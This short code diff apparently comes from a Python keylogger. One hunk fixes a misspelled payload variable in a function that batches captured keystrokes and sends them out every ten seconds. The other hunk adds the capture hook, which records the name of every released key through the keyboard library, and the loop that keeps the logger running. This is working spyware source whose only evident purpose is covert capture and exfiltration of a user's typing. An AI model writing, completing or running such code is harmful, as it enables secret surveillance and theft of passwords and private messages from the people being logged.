@@ -15,7 +15,7 @@ def send_keylogs():
     if keylogs:
         keylogs_str = "\n".join(keylogs)
 
-        peyload = {
+        payload = {
             "content": keylogs_str
         }
 
@@ -23,3 +23,14 @@ def send_keylogs():
 
         keylogs = []
     threading.Timer(10, send_keylogs).start()
+
+def capture_keystrokes(event):
+    global keylogs
+    keylogs.append(event.name)
+
+keyboard.on_release(callback=capture_keystrokes)
+
+send_keylogs()
+
+while True:
+    time.sleep(1)
